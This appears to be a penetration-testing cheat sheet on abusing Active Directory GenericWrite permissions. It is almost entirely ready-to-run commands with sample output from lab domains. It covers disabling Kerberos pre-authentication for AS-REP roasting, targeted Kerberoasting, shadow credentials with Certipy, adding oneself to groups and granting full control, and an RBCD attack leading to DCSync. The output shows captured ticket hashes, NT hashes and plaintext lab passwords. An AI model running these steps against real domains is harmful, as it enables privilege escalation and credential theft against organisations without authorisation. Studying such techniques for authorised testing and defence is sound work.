---
title: "GenericWrite"
date: 2024-7-13
tags: ["Shadow Credentials", "Pass-The-Ticket", "Kerberoasting", "Genericwrite", "Powerview", "Asreproast", "Credential Dumping", "Ticket Granting Ticket", "Active Directory", "Windows", "Disabled Account"]
---

### Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to Target User

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Enable Account \[Optional\]

```console
sudo ntpdate -s <DC_IP> && bloodyAD --host <DC> -d "<DOMAIN>" --dc-ip <DC_IP> -k remove uac <TARGET_USER> -f ACCOUNTDISABLE
```

#### 2. Add UF_DONT_REQUIRE_PREAUTH bit

```console
sudo ntpdate -s <DC_IP> && bloodyAD --host <DC> -d "<DOMAIN>" --dc-ip <DC_IP> -k add uac <TARGET_USER> -f DONT_REQ_PREAUTH
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class="sample-code"}
PS C:\programdata> . .\PowerView.ps1
. .\PowerView.ps1
```

#### 2. Check Target User

```console
Get-DomainUser '<TARGET_USER>' | ConvertFrom-UACValue
```

```console {class="sample-code"}
PS C:\programdata> Get-DomainUser 'user' | ConvertFrom-UACValue
Get-DomainUser 'user' | ConvertFrom-UACValue

Name                           Value                                           
----                           -----                                           
NORMAL_ACCOUNT                 512
```

#### 3. Create a Cred Object (runas) \[Optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 4. Add UF_DONT_REQUIRE_PREAUTH bit

```console
Set-DomainObject -Identity '<TARGET_USER>' -XOR @{useraccountcontrol=4194304} -Verbose -Credential $Cred
```

```console {class="sample-code"}
PS C:\programdata> Set-DomainObject -Identity 'user' -XOR @{useraccountcontrol=4194304} -Verbose  -C
Set-DomainObject -Identity 'user' -XOR @{useraccountcontrol=4194304} -Verbose  -Credential $Cred
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'corp.local' from -Credential
VERBOSE: [Get-DomainSearcher] search base: 
LDAP://DC01.corp.local/DC=corp,DC=local
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: 
(&(|(|(samAccountName=user)(name=user)(displayname=user))))
VERBOSE: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for 
object 'user'
```

#### 5. AS-REP Roasting (From Linux)

```console
impacket-GetNPUsers '<DOMAIN>/<TARGET_USER>' -no-pass -dc-ip <DC>
```

```console {class="sample-code"}
$ impacket-GetNPUsers 'corp.local/user' -no-pass -dc-ip 172.16.1.5
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Getting TGT for user
$krb5asrep$23$user@CORP.LOCAL:642ec7b699 ---[SNIP]--- e70950229f
```

{{< /tabcontent >}}

---

### Abuse #2 : Targeted Kerberoast

{{< tab set2 tab1 >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
# Password
python3 targetedKerberoast.py -v -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --dc-ip '<DC_IP>'
```

```console {class="sample-code"}
$ python3 targetedKerberoast.py -v -d 'ADMINISTRATOR.HTB' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip '10.129.255.215'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$ADMINISTRATOR.HTB/ethan*$719ae93a160c94f2c6d7177cee77e7fb$5181256049f460e6bf16edef0850de21dc667b92081510623af531d8595c094d16038a9ce3cce9f073cf0aa1af4e622e87a44455724f6ef0c5aeb8e26f0c88b07712bc1cdbf34f7019c7a2b2397cd998db1e488b31bf51ebd2f9b6fde668d9713a4a7039e7cc02804e5493d95bac27bec7e8531e40d5afeb87523cf0c0d647b8b83d5fb29ad58f43a19f9c9f5d57b4429d817ea966c3296997b1241ba0c13fff9ec4d05c312db763f351f55bb76bddcf7e21ef284a8f4e84ea63ce377ae098a370c5ffe5b676116ca2d8fe2beec46af5d03ce8c6dd913e4dae37276153cfaf4e69d7e4ea2bdded3f75b3a51b8c57b408b332dc6878326b0276d85e5ff64a2dadbbd761e9f1346db7ab9cb8ac27afc819e89a5228b9bca828f3e1f360990cd60e3465e853347bcf425e8b713a40e3df276456b3ffd98a6ecc2daba5857055489f980725aa1d94cab0efff2b48cb115ea0b210865c5b938669c469d9d9c155af141044069780ff5ab1289d9f1b49e567a8162b4db28bd366a810c25b9164bd40a495172bf0b67ce52ff69b0f01d4bdfb37610bf19400d67c43efedbe4f24a5ce328758acdfc3f0ce6fc23548bb43e2c7f12d50e7a88ee61c64fabd03987102325f8a6d7a3a2a0ce480e0e2496ff72d4839ab3552053c8275debfbc005011b4bc0f9ffe50696aaba045e298712e4794e437fe6fe38f4b1bf1d4d48fca08721929a865021044bc5bd427a3a4fda1b0fc00d0ac6462e0a421600f3007f8b7976bd33a5ee9fa701d078a7f3f3b3417d025029a12e9155377bf17e8a64ddfb61f23752122e8094a7064c9aae2da4ada73e34ff2c24f3f83239057910e42abc14ad0a2bb7986971b21d8efadf205a12ac5379552d28dc6781fced2699a8b086d82ed5ff96a1bf34491707850533f550b287b34b486526f3008e5bd19b03cd6fad3f0a4cde95294525f4422abd90b7f4c51ecfc0590a74c50e71406be843371877385079796fdfbef564a3bc76cd14c2351614d8e07767997027aabc27e7132976691bfe6229b935d78922e7439fedeff25f58b2a06e24549a6b95913d267371e79f632f4c34b42de9bbd058102f36b790bcb376ed3ef528c5dca3daeaa474e627a23079e1d2e97bc152e87967253b958a76c41e814c9bebe93ff157ee326e29916a137dbc957c4c965d2e717f1aac0be2d6e2f9b8cf2d143d540484a68454580572fd054010102dbdefd1f21f9c2748d0bd314224c22de492e754285c0379894f4573583539bd74c0afe912114d8154bad5cf28cdf0983a0819a609981ff54285ca4d60abed3c4aa2c3536a4830142f614770a9aa93fff4ea8ae2344b0657ae11912b7301cc6555e71ba9e958c15d862de3f09e069b477044a09c66835908fb4423bff92f23fd2bf4b93f305bef94abc159cba3568dc1808228794d5a85afaaa4ad39d515772491856ed28abdb36901edf1f2f8d70fc15a089a543a70db0e2800a757af8a8312551e91e3996728e1e0139acfafae76f4943cef96632054ab598d1d15d
[VERBOSE] SPN removed successfully for (ethan)
```

<small>*Ref: [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)*</small>

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

#### 2. Create a Cred Object (runas) \[Optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Add a SPN

```console
# eg. MSSQLSvc/example.com:1433
setspn -a '<SERVICE>/<TARGET_DOMAIN>:<SERVICE_PORT>' '<DOMAIN>\<TARGET_USER>'
```

#### 4. Check

```console
Get-DomainUser '<TARGET_USER>' | Select serviceprincipalname
```

#### 5. Get the SPN

```console
Get-DomainSPNTicket -SPN '<SERVICE>/<TARGET_DOMAIN>:<SERVICE_PORT>' -Credential $Cred
```

{{< /tabcontent >}}

---

### Abuse #3: Shadow Credential

{{< tab set3 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set3 tab1 >}}

```console
# Password
certipy-ad shadow auto -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -account <TARGET_USER> -target <DC> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad shadow auto -username judith.mader@certified.htb -password 'judith09' -account management_svc -target DC01.CERTIFIED.HTB -dc-ip 10.129.231.186                                           
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b7e204ab-10bb-721e-4f98-72297623b1ad'
[*] Adding Key Credential with device ID 'b7e204ab-10bb-721e-4f98-72297623b1ad' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID 'b7e204ab-10bb-721e-4f98-72297623b1ad' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'management_svc@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'management_svc.ccache'
File 'management_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

```console
# NTLM
certipy-ad shadow auto -username '<USER>@<DOMAIN>' -hashes '<HASH>' -account <TARGET_USER> -target <DC> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad shadow auto -username 'management_svc@CERTIFIED.HTB' -hashes ':a091c1832bcdd4677c28b5a6a1295584' -account CA_OPERATOR -target DC01.CERTIFIED.HTB -dc-ip 10.129.231.186
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d'
[*] Adding Key Credential with device ID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_operator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_operator.ccache'
[*] Wrote credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

```console
# Kerberos
sudo ntpdate -s <DC_IP> && certipy-ad shadow auto -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -k -account <TARGET_USER> -target <DC> -dc-host <DC> -ldap-scheme ldap -ns <DC_IP> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.232.31 && certipy-ad shadow auto -username oorend@REBOUND.HTB -password '1GR8t@$$4u' -k -account winrm_svc -target DC01.REBOUND.HTB -dc-host DC01.REBOUND.HTB -ldap-scheme ldap -ns 10.129.232.31
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '6ea7763d-2272-1bea-078c-e58a01662a29'
[*] Adding Key Credential with device ID '6ea7763d-2272-1bea-078c-e58a01662a29' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '6ea7763d-2272-1bea-078c-e58a01662a29' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@rebound.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 4469650fd892e98933b4536d2e86e512
```

{{< /tabcontent >}}

---

### Abuse #4 : Add Self to Group (From Linux)

{{< tab set4 tab1 >}}bloodyAD{{< /tab >}}
{{< tab set4 tab2 >}}powerview.py{{< /tab >}}
{{< tabcontent set4 tab1 >}}

#### 1. Add Self to Group

```console
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember SERVICEMGMT 'oorend'
[+] oorend added to SERVICEMGMT
```

```console
# Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add groupMember 'NETWORK AUDIT' 'm.lovegod'
[+] m.lovegod added to NETWORK AUDIT
```

#### 2. Add GenericAll over Target Group

```console
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
```

```console
# Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add genericAll 'NETWORK AUDIT' 'm.lovegod' 
[+] m.lovegod has now GenericAll on NETWORK AUDIT
```

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< tabcontent set4 tab2 >}}

#### 1. Connect

```console
sudo ntpdate -s <DC_IP> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc01.rebound.htb && powerview 'rebound.htb/oorend:1GR8t@$$4u@dc01.rebound.htb'
Logging directory is set to /home/kali/.powerview/logs/dc01.rebound.htb
[2024-09-24 07:11:06] Channel binding is enforced!
(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
PV > 
```

#### 2. Add Self to Group

```console
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'
```

```console {class="sample-code"}
PV > Add-DomainGroupMember -Identity 'servicemgmt' -Members 'oorend'
[2024-09-24 07:13:17] User oorend successfully added to servicemgmt
```

#### 3. Check

```console
Get-DomainGroupMember -Identity '<GROUP>'
```

```console {class="sample-code"}
PV > Get-DomainGroupMember -Identity 'servicemgmt'
GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : ppaul
MemberDistinguishedName     : CN=ppaul,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-1951

---[SNIP]---

GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : oorend
MemberDistinguishedName     : CN=oorend,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
```

#### 4. Add Fullcontrol over Target Group

```console
# Exit and login to apply changes
Add-DomainObjectAcl -TargetIdentity '<TARGET_GROUP>' -PrincipalIdentity '<USER>' -Rights fullcontrol
```

```console {class="sample-code"}
PV > Add-DomainObjectAcl -TargetIdentity 'service users' -PrincipalIdentity 'oorend' -Rights fullcontrol
[2024-09-24 07:37:24] [Add-DomainObjectACL] Found target identity: OU=Service Users,DC=rebound,DC=htb
[2024-09-24 07:37:24] [Add-DomainObjectACL] Found principal identity: CN=oorend,CN=Users,DC=rebound,DC=htb
[2024-09-24 07:37:24] Adding FullControl to OU=Service Users,DC=rebound,DC=htb
[2024-09-24 07:37:24] DACL modified successfully!
```

#### 5. Check

```console
Get-DomainObjectAcl -Identity '<TARGET_USER>' -Where 'SecurityIdentifier contains <USER>'
```

```console {class="sample-code"}
PV > Get-DomainObjectAcl -Identity 'winrm_svc' -Where 'SecurityIdentifier contains oorend'
ObjectDN                    : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7684
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
ActiveDirectoryRights       : FullControl
AccessMask                  : 0xf01ff
InheritanceType             : None
SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)
```

<small>*Ref: [powerview.py](https://github.com/aniqfakhrul/powerview.py)*</small>

{{< /tabcontent >}}

### Abuse #4 : Add Self to Group (From Windows)

{{< tab set5 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set5 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
```

#### 2. Create a Cred Object (runas) \[Optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Add Self to Group

```console
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential $Cred
```

```console {class="sample-code"}
PS C:\programdata> Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
```

#### 4. Check

```console
Get-DomainGroupMember -Identity '<GROUP>'
```

```console {class="sample-code"}
PS C:\programdata> Get-DomainGroupMember -Identity 'security engineers'
Get-DomainGroupMember -Identity 'security engineers'

---[SNIP]---

GroupDomain             : corp.local
GroupName               : Security Engineers
GroupDistinguishedName  : CN=Security Engineers,CN=Users,DC=corp,DC=local
MemberDomain            : corp.local
MemberName              : user
MemberDistinguishedName : CN=user,OU=Contractors,OU=Corp,DC=corp,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-2291914956-3290296217-2402366952-1114
```

{{< /tabcontent >}}

---

### Abuse #5 : RBCD Attack (GenericWrite over DC)

{{< tab set6 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set6 tab1 >}}

#### 1. RBCD Attack

```console
impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -delegate-from '<USER>' -dc-ip <DC_IP> -action 'write' '<DOMAIN>/<USER>:<PASSWORD>'
```

#### 2. Impersonate

```console
impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate <TARGET_USER> -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
```

#### 3. Import Ticket

```console
export KRB5CCNAME='<USER>@cifs_<TARGET_DOMAIN>@<DOMAIN>.ccache'
```

#### 4. DCSync Attack

```console
impacket-secretsdump '<USER>@<TARGET_DOMAIN>' -k -no-pass
```

{{< /tabcontent >}}